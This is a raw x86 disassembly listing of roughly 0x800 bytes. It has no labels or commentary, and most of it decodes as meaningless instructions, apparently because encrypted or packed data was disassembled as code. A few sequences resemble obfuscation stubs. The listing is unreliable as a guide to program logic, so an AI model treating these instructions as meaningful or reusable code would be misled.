  40395e:	or     eax,0xdbe6d93
  403963:	mov    al,0x9e
  403965:	push   cs
  403966:	sbb    al,0xac
  403968:	stos   BYTE PTR es:[edi],al
  403969:	mov    ds:0x40daf7ee,al
  40396e:	mov    edx,0x6d5739cc
  403973:	push   esp
  403974:	sbb    ecx,edx
  403976:	mov    ebp,0x356271b6
  40397b:	inc    ecx
  40397c:	push   ds
  40397d:	add    eax,DWORD PTR [edx+0x6f21321a]
  403983:	psubsw mm1,QWORD PTR [ecx]
  403986:	sbb    BYTE PTR [edi],bh
  403988:	addr16 inc ebx
  40398a:	add    al,0x5a
  40398c:	sbb    DWORD PTR [ebp-0x2876d6a0],0x4b
  403993:	sbb    DWORD PTR [edi+0x658b526d],ecx
  403999:	ret    
  40399a:	or     edx,DWORD PTR [eax]
  40399c:	push   ebx
  40399d:	clc    
  40399e:	inc    ebp
  40399f:	mov    ah,0x63
  4039a1:	(bad)  
  4039a2:	aaa    
  4039a3:	or     edx,DWORD PTR [edx*8-0x1fbfca78]
  4039aa:	fimul  DWORD PTR [ecx+ebx*4]
  4039ad:	popf   
  4039ae:	imul   ebx,DWORD PTR [esi+0x6b2f4a89],0x5e0fe02f
  4039b8:	inc    BYTE PTR [edi-0x41]
  4039bb:	je     0x403a00
  4039bd:	push   edx
  4039be:	mov    ebx,0x5fd55509
  4039c3:	fist   WORD PTR [eax+eax*8]
  4039c6:	data16 aad 0xc1
  4039c9:	mov    edx,0xccca0c85
  4039ce:	data16 or bh,dh
  4039d1:	(bad)  
  4039d2:	loopne 0x403a0a
  4039d4:	fwait
  4039d5:	mov    WORD PTR [ecx],?
  4039d7:	lock adc al,0xd4
  4039da:	out    0x83,eax
  4039dc:	mov    ds:0x84216a58,eax
  4039e2:	mov    eax,0xc5be0f34
  4039e7:	fisubr WORD PTR [ebp-0x52]
  4039ea:	mov    al,ds:0xae06e768
  4039ef:	gs sahf 
  4039f1:	xchg   esp,eax
  4039f2:	ss jne 0x403a2f
  4039f5:	mov    ss:0xaf16fd98,eax
  4039fb:	inc    ebp
  4039fc:	fsubr  QWORD PTR [esi-0x38c469d3]
  403a02:	ret    
  403a03:	outs   dx,DWORD PTR ds:[esi]
  403a04:	mov    DWORD PTR [ebp-0x46],esi
  403a07:	(bad)  
  403a08:	(bad)  [edi]
  403a0a:	dec    esi
  403a0b:	out    0x9e,eax
  403a0d:	icebp  
  403a0e:	jnp    0x403a13
  403a10:	add    DWORD PTR ds:0x47cb4e1,ebp
  403a16:	xor    bl,BYTE PTR [edi]
  403a18:	adc    al,0xd5
  403a1a:	mov    ch,0xc0
  403a1c:	sbb    ebx,DWORD PTR [eax-0x66]
  403a1f:	jb     0x4039bc
  403a21:	adc    eax,0x3949444c
  403a26:	inc    ecx
  403a27:	test   BYTE PTR [eax+0x2d],ch
  403a2a:	adc    al,0x60
  403a2c:	sub    eax,0xe5eddb97
  403a31:	fsub   st,st(0)
  403a33:	out    0xce,eax
  403a35:	test   cl,dl
  403a37:	adc    eax,DWORD PTR [eax-0x76936218]
  403a3d:	pushf  
  403a3e:	mov    ebp,DWORD PTR [ebp-0x4e12beef]
  403a44:	idiv   DWORD PTR [ebx+ebp*1]
  403a47:	inc    ebx
  403a48:	aaa    
  403a49:	pop    ecx
  403a4a:	lods   al,BYTE PTR ds:[esi]
  403a4b:	xchg   BYTE PTR [ebx],cl
  403a4d:	push   esp
  403a4e:	mov    ebx,0x49081741
  403a53:	xor    BYTE PTR [edi],dl
  403a55:	inc    ebp
  403a56:	jp     0x4039df
  403a58:	stos   DWORD PTR es:[edi],eax
  403a59:	add    al,0x74
  403a5b:	xchg   ebx,eax
  403a5c:	pop    es
  403a5d:	add    al,0xa1
  403a5f:	pop    ebp
  403a60:	adc    eax,0x110c4ada
  403a65:	inc    ebx
  403a66:	inc    ecx
  403a67:	mov    ah,0xce
  403a69:	repz repz sbb DWORD PTR [edi-0xb96aa86],0x1be27d76
  403a75:	push   ds
  403a76:	retf   
  403a77:	nop
  403a78:	inc    esi
  403a79:	je     0x403a01
  403a7b:	outs   dx,BYTE PTR ds:[esi]
  403a7c:	mov    esi,0x69735114
  403a81:	ret    
  403a82:	(bad)  
  403a83:	mov    al,ds:0x21f10b79
  403a88:	das    
  403a89:	in     al,0x2f
  403a8b:	inc    ebx
  403a8c:	push   0x70
  403a8e:	cmp    BYTE PTR ds:0x6313ec60,cl
  403a94:	sbb    DWORD PTR [ecx],esi
  403a96:	sub    ebp,DWORD PTR [edi]
  403a98:	jmp    0x403ad0
  403a9a:	mov    ecx,0x8918b675
  403a9f:	add    ebx,ebx
  403aa1:	xchg   esi,eax
  403aa2:	mov    BYTE PTR [eax-0x73d9ec7a],bh
  403aa8:	js     0x403a5e
  403aaa:	dec    edx
  403aab:	imul   esi,DWORD PTR [edx+0x7],0x9d54bfbb
  403ab2:	dec    esi
  403ab3:	mov    bl,0x31
  403ab5:	enter  0x52d2,0xa0
  403ab9:	push   esi
  403aba:	adc    dl,BYTE PTR [ebp-0x2184c627]
  403ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ac1:	mov    edx,0xd43c3827
  403ac6:	xlat   BYTE PTR ds:[ebx]
  403ac7:	mov    cs,WORD PTR [ebp+0xaa216c3]
  403acd:	sbb    dl,0x8f
  403ad0:	cld    
  403ad1:	cld    
  403ad2:	sub    eax,0x476af672
  403ad7:	ds jl  0x403b05
  403ada:	xor    eax,0x702162d7
  403adf:	pop    esi
  403ae0:	out    0xb0,al
  403ae2:	pusha  
  403ae3:	jne    0x403b0c
  403ae5:	add    al,BYTE PTR [ebp-0x44]
  403ae8:	mov    esp,0xc035a4f0
  403aed:	mov    ch,0xc7
  403aef:	bound  ecx,QWORD PTR [edx-0x48f000bb]
  403af5:	or     eax,0x42e76b
  403afa:	adc    DWORD PTR ds:0x42fdf6,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e1a4,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fd7d,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fd75
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x43711197],esi
  403b3e:	or     eax,ebp
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x4370707d
  403b48:	retf   0xcf5e
  403b4b:	ins    BYTE PTR es:[edi],dx
  403b4c:	sar    DWORD PTR [edi],0x78
  403b4f:	xor    eax,0x50ffc8a5
  403b54:	scas   al,BYTE PTR es:[edi]
  403b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b56:	mov    eax,ds:0xe59bc267
  403b5b:	xor    BYTE PTR [esi-0x4cd2125a],ch
  403b61:	call   0x61647e4a
  403b66:	shl    DWORD PTR [edi],1
  403b68:	sbb    DWORD PTR [ebx+eax*8],ebp
  403b6b:	adc    eax,0x1fc27ef0
  403b70:	inc    ecx
  403b71:	pop    ss
  403b72:	std    
  403b73:	jno    0x403b9c
  403b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b76:	xor    cl,BYTE PTR [ebp+0x13]
  403b79:	push   ss
  403b7a:	mov    edx,eax
  403b7c:	cwde   
  403b7d:	sbb    eax,0x5e05bad
  403b82:	sub    DWORD PTR [edx],edi
  403b84:	jns    0x403b79
  403b86:	loope  0x403b4e
  403b88:	sbb    bl,al
  403b8a:	xchg   esi,eax
  403b8b:	(bad)  
  403b8c:	in     al,dx
  403b8d:	imul   ebp
  403b8f:	jns    0x403b2b
  403b91:	jmp    0x3df9:0xa308792e
  403b98:	ret    
  403b99:	push   ebx
  403b9a:	push   ebp
  403b9b:	push   0xffffffe9
  403b9d:	cmp    ch,BYTE PTR [edi]
  403b9f:	fst    st(2)
  403ba1:	mov    dh,0xc6
  403ba3:	cld    
  403ba4:	dec    edx
  403ba5:	repnz add esp,esi
  403ba8:	aam    0x1c
  403baa:	cmc    
  403bab:	sbb    edi,DWORD PTR [ecx]
  403bad:	loopne 0x403bae
  403baf:	mov    ebp,0x634dff89
  403bb4:	dec    esp
  403bb5:	dec    edi
  403bb6:	or     DWORD PTR [esi],eax
  403bb8:	in     eax,0xaa
  403bba:	pop    ds
  403bbb:	inc    eax
  403bbc:	mov    ds:0x4f9d73c4,eax
  403bc1:	xchg   esi,eax
  403bc2:	stos   DWORD PTR es:[edi],eax
  403bc3:	into   
  403bc4:	test   ebx,ebx
  403bc6:	mov    ds:0x2c647a7e,al
  403bcb:	jae    0x403b65
  403bcd:	cmp    eax,0x59ddb96d
  403bd2:	addr16 xchg esp,eax
  403bd4:	push   ebp
  403bd5:	pop    es
  403bd6:	xor    dl,BYTE PTR [edi+0x61]
  403bd9:	dec    ebp
  403bda:	jecxz  0x403bec
  403bdc:	enter  0x8c5c,0x31
  403be0:	or     BYTE PTR es:[ebx-0x4f1cf350],ah
  403be7:	pop    ds
  403be8:	icebp  
  403be9:	stos   DWORD PTR es:[edi],eax
  403bea:	jo     0x403b9f
  403bec:	dec    esp
  403bed:	inc    ebx
  403bee:	sbb    BYTE PTR [edx+esi*4+0x1c],ah
  403bf2:	dec    edx
  403bf3:	es adc ecx,ecx
  403bf6:	stc    
  403bf7:	test   ah,dl
  403bf9:	add    dl,BYTE PTR [edi]
  403bfb:	push   ss
  403bfc:	dec    ecx
  403bfd:	mov    eax,0x7e09023f
  403c02:	cmp    BYTE PTR [ebp-0x22],bh
  403c05:	repz out dx,eax
  403c07:	das    
  403c08:	inc    esi
  403c09:	outs   dx,DWORD PTR ds:[esi]
  403c0a:	xor    eax,0x597136a1
  403c0f:	push   edx
  403c10:	sti    
  403c11:	test   BYTE PTR [eax],bl
  403c13:	mov    edi,0x5ba17d9c
  403c18:	xchg   ebx,eax
  403c19:	fcom   DWORD PTR [edi+0x36]
  403c1c:	popf   
  403c1d:	in     eax,0xf7
  403c1f:	call   0x1a6c15b7
  403c24:	ret    0x2e84
  403c27:	xor    eax,0xaac1ae9d
  403c2c:	dec    ecx
  403c2d:	fldenv [ebx+edi*1]
  403c30:	shl    ch,1
  403c32:	pop    ds
  403c33:	in     al,dx
  403c34:	retf   
  403c35:	and    esi,DWORD PTR [eax]
  403c37:	sbb    eax,0xc9cb90d4
  403c3c:	jl     0x403c31
  403c3e:	jmp    FWORD PTR [eax+0x6ef0f077]
  403c44:	and    DWORD PTR [edi-0x2],0x7afc71cb
  403c4b:	mov    ebx,0xfef9648c
  403c50:	dec    eax
  403c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c52:	inc    edx
  403c53:	mov    dl,0x8e
  403c55:	mov    eax,ds:0x409800a5
  403c5a:	call   0xc121b2bd
  403c5f:	outs   dx,DWORD PTR ds:[esi]
  403c60:	out    dx,eax
  403c61:	inc    ebx
  403c62:	enter  0x1e00,0x5
  403c66:	lds    edx,FWORD PTR [ebp+0x1f]
  403c69:	push   fs
  403c6b:	gs sub eax,0x619cf6dd
  403c71:	jnp    0x403c72
  403c73:	pop    edx
  403c74:	ins    BYTE PTR es:[edi],dx
  403c75:	shr    DWORD PTR [edi],cl
  403c77:	cmp    al,0x1a
  403c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c7a:	jnp    0x403c47
  403c7c:	push   ss
  403c7d:	ss dec edx
  403c7f:	xchg   esi,eax
  403c80:	lods   eax,DWORD PTR ds:[esi]
  403c81:	imul   eax,ecx,0xb91054ab
  403c87:	xchg   esp,eax
  403c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c89:	xor    ebx,DWORD PTR [esi]
  403c8b:	das    
  403c8c:	test   dl,ch
  403c8e:	or     bl,BYTE PTR [ebp-0x1ef57fb9]
  403c94:	fmulp  st(0),st
  403c96:	aam    0x94
  403c98:	cdq    
  403c99:	jmp    0x403d03
  403c9b:	mov    dh,0x86
  403c9d:	sub    eax,ebp
  403c9f:	shl    BYTE PTR [eax-0x47818b18],cl
  403ca5:	arpl   WORD PTR [ecx-0x3f],ax
  403ca8:	mov    ch,0x6
  403caa:	dec    ebp
  403cab:	or     BYTE PTR [edi-0x4c],ah
  403cae:	nop
  403caf:	rol    BYTE PTR [esi-0x267735fd],0xed
  403cb6:	adc    edi,DWORD PTR [esi]
  403cb8:	sub    BYTE PTR [edx],bh
  403cba:	call   0xdccc:0x32da43d5
  403cc1:	sbb    DWORD PTR [ecx-0x104e94e2],0xadb6aef
  403ccb:	mov    eax,ds:0xa19ee18e
  403cd0:	enter  0xaa62,0x15
  403cd4:	imul   edi,esi,0x1b
  403cd7:	test   al,0xb3
  403cd9:	ss aam 0xa
  403cdc:	and    ch,cl
  403cde:	xor    al,0x31
  403ce0:	sub    dl,BYTE PTR ds:0xaee46ec2
  403ce6:	stos   BYTE PTR es:[edi],al
  403ce7:	pop    ds
  403ce8:	adc    dl,BYTE PTR [eax]
  403cea:	mov    edx,0xe7f9b1a3
  403cef:	aaa    
  403cf0:	test   DWORD PTR [ebp-0x46],esp
  403cf3:	inc    ebx
  403cf4:	ss adc eax,0x94522550
  403cfa:	and    edi,DWORD PTR [edi-0x7e]
  403cfd:	ds jo  0x403c91
  403d00:	out    dx,eax
  403d01:	rcl    DWORD PTR [ebx],1
  403d03:	add    al,0xb1
  403d05:	xchg   ecx,eax
  403d06:	fild   WORD PTR [eax+0x17]
  403d09:	pop    ss
  403d0a:	xor    ecx,DWORD PTR [edi]
  403d0c:	scas   al,BYTE PTR es:[edi]
  403d0d:	dec    esi
  403d0e:	retf   0x50b7
  403d11:	in     eax,0xc6
  403d13:	cmc    
  403d14:	leave  
  403d15:	rcl    bl,cl
  403d17:	dec    eax
  403d18:	jae    0x403d8a
  403d1a:	jecxz  0x403d7c
  403d1c:	retf   
  403d1d:	push   cs
  403d1e:	fs jnp 0x403d2b
  403d21:	sub    BYTE PTR [esi+0x417cfe8b],dl
  403d27:	inc    ebp
  403d28:	or     al,0xbd
  403d2a:	dec    ebp
  403d2b:	cdq    
  403d2c:	mov    BYTE PTR [esi-0x4c],dh
  403d2f:	and    BYTE PTR [esi-0x1200d015],bl
  403d35:	aam    0x96
  403d37:	inc    esp
  403d38:	push   ss
  403d39:	inc    edx
  403d3a:	xor    al,0xb6
  403d3c:	push   es
  403d3d:	addr16 jb 0x403d33
  403d40:	lea    esi,[ecx]
  403d42:	loopne 0x403d1d
  403d44:	add    edi,DWORD PTR ds:0x41382ee8
  403d4a:	mov    ch,0xe7
  403d4c:	ins    DWORD PTR es:[edi],dx
  403d4d:	xchg   ebx,esi
  403d4f:	dec    ecx
  403d50:	push   0x1c9e85df
  403d55:	fstp   TBYTE PTR [eax+0x15be0053]
  403d5b:	pop    es
  403d5c:	adc    DWORD PTR [esi-0x61],0xffffff94
  403d60:	push   es
  403d61:	sar    ebx,cl
  403d63:	fstp   QWORD PTR [ecx+0x6b]
  403d66:	jb     0x403d34
  403d68:	mov    eax,ds:0x6fc670a7
  403d6d:	xlat   BYTE PTR ds:[ebx]
  403d6e:	cmc    
  403d6f:	sub    DWORD PTR [ebx-0x629fd10e],edx
  403d75:	fisubr DWORD PTR [ecx]
  403d77:	arpl   WORD PTR [ebp+0x67],cx
  403d7a:	mov    DWORD PTR [esi],0x604db952
  403d80:	jle    0x403d9a
  403d82:	sub    al,0xf9
  403d85:	dec    edi
  403d86:	jmp    0x8fedc0da
  403d8b:	aas    
  403d8c:	mov    al,ds:0xbeb3fec1
  403d91:	(bad)  
  403d92:	mov    ecx,0x217a1743
  403d97:	call   0x10c2d5bf
  403d9c:	push   eax
  403d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d9f:	sbb    DWORD PTR [ebp+0x46cd6fbb],ebp
  403da5:	stc    
  403da6:	into   
  403da7:	xchg   edx,eax
  403da8:	aad    0x91
  403daa:	mov    ch,0x40
  403dac:	dec    eax
  403dad:	pop    eax
  403dae:	adc    esp,DWORD PTR [ecx+0x5e]
  403db1:	stos   BYTE PTR es:[edi],al
  403db2:	stc    
  403db3:	clc    
  403db4:	in     eax,0xac
  403db6:	ins    BYTE PTR es:[edi],dx
  403db7:	mov    al,ds:0x4aac765a
  403dbc:	fdivr  QWORD PTR [edi-0x7b7bc3a3]
  403dc2:	xor    esi,edi
  403dc4:	push   ebx
  403dc5:	xchg   esi,eax
  403dc6:	adc    ah,BYTE PTR [ebx+eiz*4]
  403dc9:	sbb    eax,0x339d62d8
  403dce:	and    eax,0xf9c2f447
  403dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dd4:	and    BYTE PTR [ebx-0x4422716],0x73
  403ddb:	sti    
  403ddc:	repz clc 
  403dde:	add    esp,ebx
  403de0:	fcomip st,st(0)
  403de2:	repz int 0x52
  403de5:	arpl   WORD PTR [eax+edx*1],ax
  403de8:	lods   al,BYTE PTR ds:[esi]
  403de9:	leave  
  403dea:	shl    edi,1
  403dec:	ret    0xe243
  403def:	enter  0xaa81,0x10
  403df3:	add    al,0xdf
  403df5:	rol    DWORD PTR [ebp-0x1d3d0bc],0x9b
  403dfc:	and    al,0x88
  403dfe:	cmp    esi,ebx
  403e00:	jb     0x403df2
  403e02:	jge    0x403e29
  403e04:	dec    ecx
  403e05:	xchg   esp,eax
  403e06:	adc    dl,BYTE PTR [edx+ecx*8+0x18e391aa]
  403e0d:	test   DWORD PTR [esi-0x3c431e60],ecx
  403e13:	mov    dh,0x93
  403e15:	jmp    0x403e1b
  403e17:	xor    DWORD PTR [esi+0x1b],0xf78a3429
  403e1e:	mov    ss,WORD PTR [edi]
  403e20:	outs   dx,DWORD PTR ds:[esi]
  403e21:	imul   edx,eax,0x9fda64b9
  403e27:	lds    ebx,FWORD PTR [ebx+0x48]
  403e2a:	pusha  
  403e2b:	dec    ebx
  403e2c:	push   cs
  403e2d:	popa   
  403e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e2f:	jmp    0x434c:0x2137dfdf
  403e36:	stc    
  403e37:	add    esp,DWORD PTR [ebx]
  403e39:	sub    eax,0x85e4a4ae
  403e3e:	xchg   esp,eax
  403e3f:	mov    ch,0xb2
  403e41:	mov    ds:0x177058cc,eax
  403e46:	fadd   st(2),st
  403e48:	es mov ch,0x46
  403e4b:	xor    al,0x1d
  403e4d:	outs   dx,DWORD PTR ds:[esi]
  403e4e:	retf   0x9d62
  403e51:	popa   
  403e52:	popf   
  403e53:	into   
  403e54:	mov    BYTE PTR [ebx-0x21],dh
  403e57:	dec    esp
  403e58:	hlt    
  403e59:	in     al,0xd
  403e5b:	(bad)  
  403e5c:	xchg   esp,eax
  403e5d:	outs   dx,DWORD PTR ds:[esi]
  403e5e:	cmc    
  403e5f:	data16 js 0x403ea9
  403e62:	jp     0x403eb5
  403e64:	fild   WORD PTR [ebp+ebx*1+0x54]
  403e68:	sbb    BYTE PTR [ebp+0x2ccf938],cl
  403e6e:	xor    dl,BYTE PTR [ebx+edi*1-0x4a5617e3]
  403e75:	ja     0x403e3a
  403e77:	xchg   DWORD PTR [edi],esp
  403e79:	xor    al,0x9b
  403e7b:	mov    bl,BYTE PTR [esi]
  403e7d:	fs aaa 
  403e7f:	popa   
  403e80:	push   ebx
  403e81:	sub    edx,esi
  403e83:	cmp    BYTE PTR [edi],0x67
  403e86:	imul   edx,DWORD PTR [edx+0x45c7f9dc],0x9c8530f0
  403e90:	clc    
  403e91:	mov    eax,DWORD PTR [ebp-0x8]
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e19c
  403ea2:	adc    DWORD PTR ds:0x42e78f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fdf2,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd85,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e76f,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x154c1c35
  403eec:	in     al,0x1
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403ec1
  403ef7:	test   al,0x82
  403ef9:	pop    ds
  403efa:	arpl   WORD PTR [esi+eax*2+0x44631599],bp
  403f01:	xchg   dh,ah
  403f03:	inc    ebx
  403f04:	call   0x9eb6:0xd017f18c
  403f0b:	iret   
  403f0c:	adc    DWORD PTR [edx+eiz*4],esp
  403f0f:	loope  0x403ef8
  403f11:	pop    ebp
  403f12:	lea    esp,[eax-0x7e90b58a]
  403f18:	(bad)  
  403f19:	sbb    al,bh
  403f1b:	rol    edx,1
  403f1d:	adc    edx,ebx
  403f1f:	daa    
  403f20:	icebp  
  403f21:	jge    0x403ed7
  403f23:	sub    al,0x94
  403f26:	dec    ebp
  403f27:	inc    esi
  403f28:	jecxz  0x403f88
  403f2a:	mov    dh,0xf6
  403f2c:	cli    
  403f2d:	clc    
  403f2e:	aad    0x42
  403f30:	mov    bh,0x31
  403f32:	outs   dx,BYTE PTR ds:[esi]
  403f33:	ss sti 
  403f35:	pop    esi
  403f36:	addr16 push 0xffffff9a
  403f39:	or     BYTE PTR [ecx+0x53],0xf9
  403f3d:	jnp    0x403f7e
  403f3f:	mov    edx,0x6178a916
  403f44:	fcomp  st(6)
  403f46:	lea    ebp,[ebx-0x25702fd3]
  403f4c:	cmp    ebp,DWORD PTR ds:0xd12c70e9
  403f52:	fild   DWORD PTR [edx+0xfbe67ad]
  403f58:	lods   eax,DWORD PTR ds:[esi]
  403f59:	cs mov ds,ebp
  403f5c:	xchg   esp,eax
  403f5d:	ins    DWORD PTR es:[edi],dx
  403f5e:	cmp    ecx,DWORD PTR [esi-0x3c45bf0b]
  403f64:	addr16 sbb ecx,ebx
  403f67:	mov    eax,0xb1b07f90
  403f6c:	mov    edi,0xd7547ee6
  403f71:	iret   
  403f72:	scas   eax,DWORD PTR es:[edi]
  403f73:	pop    ecx
  403f74:	cwde   
  403f75:	mov    ds:0xe3d7605d,al
  403f7a:	js     0x403f95
  403f7c:	push   ss
  403f7d:	ins    DWORD PTR es:[edi],dx
  403f7e:	xor    al,0x9a
  403f80:	imul   esi,DWORD PTR [eax],0x6814f2d9
  403f86:	popa   
  403f87:	sqrtps xmm1,XMMWORD PTR [ecx-0x53]
  403f8b:	pusha  
  403f8c:	fst    QWORD PTR [ecx-0x1df7eaff]
  403f92:	jecxz  0x403f30
  403f94:	xchg   edi,eax
  403f95:	mov    dl,0x23
  403f97:	inc    ebp
  403f98:	inc    esp
  403f99:	pop    eax
  403f9a:	mov    BYTE PTR [edx+edx*1+0x22],bh
  403f9e:	dec    esi
  403f9f:	gs jecxz 0x404003
  403fa2:	mov    dh,0x66
  403fa4:	jmp    0x403f7d
  403fa6:	outs   dx,BYTE PTR ds:[esi]
  403fa7:	call   0x8191:0xda809415
  403fae:	xlat   BYTE PTR ds:[ebx]
  403faf:	xor    al,0x43
  403fb1:	jbe    0x403ff2
  403fb3:	sub    bl,BYTE PTR [ebp+0x50]
  403fb6:	and    al,0x9b
  403fb8:	std    
  403fb9:	pop    es
  403fba:	xor    BYTE PTR [ebx-0x1f],bl
  403fbd:	adc    esp,DWORD PTR [ebx+0x7371c99f]
  403fc3:	addr16 test cl,ch
  403fc6:	mov    ecx,0xe2f1a8ee
  403fcb:	iret   
  403fcc:	adc    BYTE PTR [edi],bl
  403fce:	mov    ebx,DWORD PTR [ecx+0x64]
  403fd1:	xchg   ebp,eax
  403fd2:	iret   
  403fd3:	and    cl,BYTE PTR [ebp+0x11]
  403fd6:	bnd lock jmp 0xd40c1830
  403fdd:	mov    eax,0x169f74e
  403fe2:	clc    
  403fe3:	rcr    DWORD PTR [edx+0x2fb35af8],0xa
  403fea:	xchg   edi,eax
  403feb:	or     ch,BYTE PTR [ebx+0x6c]
  403fee:	cld    
  403fef:	ret    
  403ff0:	lods   eax,DWORD PTR ds:[esi]
  403ff1:	sbb    eax,ecx
  403ff3:	mov    ds:0x67efd3b,al
  403ff8:	clc    
  403ff9:	jns    0x403f94
  403ffb:	dec    edx
  403ffc:	stos   BYTE PTR es:[edi],al
  403ffd:	idiv   DWORD PTR [ebp+0x0]
  404000:	mov    esp,0x15e0e2a8
  404005:	jae    0x403fd6
  404007:	or     al,al
  404009:	or     BYTE PTR [esi-0x6b],ah
  40400c:	sub    BYTE PTR [ebx],al
  40400e:	jecxz  0x403fe0
  404010:	fld    st(2)
  404012:	iret   
  404013:	pop    esp
  404014:	aam    0x39
  404016:	loop   0x404058
  404018:	pop    ebp
  404019:	fistp  QWORD PTR [edi-0x36]
  40401c:	mov    eax,ds:0x204fd0d4
  404021:	neg    DWORD PTR [esi+0x5c]
  404024:	out    0xeb,eax
  404026:	or     eax,0x10fde202
  40402b:	sub    DWORD PTR [edi+ebx*2-0x3c],0x29
  404030:	popa   
  404031:	xchg   ebp,eax
  404032:	push   esi
  404033:	or     BYTE PTR [ebp-0x51],al
  404036:	lock nop
  404038:	in     eax,0x44
  40403a:	inc    edx
  40403b:	adc    DWORD PTR [esi+edx*1],edx
  40403e:	arpl   WORD PTR [edx],cx
  404040:	in     eax,0x76
  404042:	fldenv [ecx]
  404044:	pusha  
  404045:	adc    BYTE PTR [ebp+0x7d],ah
  404048:	arpl   WORD PTR [edi+0x63e20464],si
  40404e:	(bad)  
  40404f:	push   ds
  404050:	div    DWORD PTR [eax-0x57dfc80c]
  404056:	mov    ds:0x664f1828,eax
  40405b:	pop    eax
  40405c:	dec    edx
  40405d:	sbb    BYTE PTR [edi],ah
  40405f:	or     DWORD PTR [ebp+0xe],0xffffffb7
  404063:	lods   al,BYTE PTR ds:[esi]
  404064:	or     edx,ecx
  404066:	ret    0x2999
  404069:	jne    0x404017
  40406b:	mov    al,0x47
  40406d:	xlat   BYTE PTR ds:[ebx]
  40406e:	xor    eax,0x42cd736e
  404073:	add    eax,0x4a7ae979
  404078:	mov    DWORD PTR [esi-0xc39d0d2],esi
  40407e:	ds out 0x0,al
  404081:	or     al,0xf9
  404083:	sti    
  404084:	aad    0xbb
  404086:	add    ebx,eax
  404088:	mov    ds:0xc3d69cb5,al
  40408d:	aad    0x37
  40408f:	dec    edi
  404090:	(bad)  
  404091:	cmp    dl,dh
  404093:	repz cld 
  404095:	mov    eax,ds:0xb671b20b
  40409a:	popa   
  40409b:	jo     0x404052
  40409d:	xchg   ebp,eax
  40409e:	and    DWORD PTR [ebx+0x2e0e5a27],eax
  4040a4:	leave  
  4040a5:	sar    DWORD PTR [esi+0x2d],cl
  4040a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040a9:	sbb    bh,dh
  4040ab:	int3   
  4040ac:	xchg   esp,eax
  4040ad:	retf   
  4040ae:	sub    eax,DWORD PTR [eax+0x1e]
  4040b1:	mov    ch,0x63
  4040b3:	xor    al,0x12
  4040b5:	pop    ds
  4040b6:	cld    
  4040b7:	pop    ebx
  4040b8:	es inc esp
  4040ba:	mov    eax,0xc5b0c0be
  4040bf:	dec    ecx
  4040c0:	dec    esi
  4040c1:	sub    eax,0x8b1bd506
  4040c6:	setle  BYTE PTR [eax+0x12375b2e]
  4040cd:	push   ecx
  4040ce:	sub    al,0xf8
  4040d0:	xor    eax,0xc181c306
  4040d5:	mov    al,0x7b
  4040d7:	pop    edi
  4040d8:	jb     0x4040d6
  4040da:	mov    DWORD PTR [edx+0x7b],esp
  4040dd:	ss mov dl,0x20
  4040e0:	mov    ds:0x3a2dc884,eax
  4040e5:	jb     0x4040c9
  4040e7:	xchg   ebp,eax
  4040e8:	ja     0x404096
  4040ea:	add    bh,BYTE PTR [ebx-0x46]
  4040ed:	loopne 0x4040e0
  4040ef:	or     ecx,DWORD PTR [ecx+0x14404aeb]
  4040f5:	rcr    DWORD PTR [edi-0x1d9ba26c],1
  4040fb:	xchg   DWORD PTR [ebp+0x10],esi
  4040fe:	int    0x4a
  404100:	fcmovne st,st(2)
  404102:	xchg   DWORD PTR [ecx],ecx
  404104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404105:	sub    eax,DWORD PTR [ebx+0x60]
  404108:	outs   dx,DWORD PTR ds:[esi]
  404109:	repz mov esp,0x1b13b156
  40410f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404110:	sbb    ecx,DWORD PTR [edi+eiz*1-0x7a9a7faa]
  404117:	imul   ecx,DWORD PTR [ebx+ebp*1-0x5986149a],0xfffffffd
  40411f:	pop    ebx
  404120:	pop    ebp
  404121:	jno    0x40418c
  404123:	neg    ch
  404125:	loop   0x4040b1
  404127:	outs   dx,BYTE PTR ds:[esi]
  404128:	push   cs
  404129:	call   0xb3824f5c
  40412e:	and    al,0xf
  404130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404131:	mov    ah,0x49
  404133:	adc    DWORD PTR [ecx],esp
  404135:	or     al,0x91
  404137:	cmp    eax,0xe53ccb48
  40413c:	inc    ecx
  40413d:	fldenv [eax+0x78]
  404140:	push   0xffffffec
  404142:	add    BYTE PTR [edi],cl
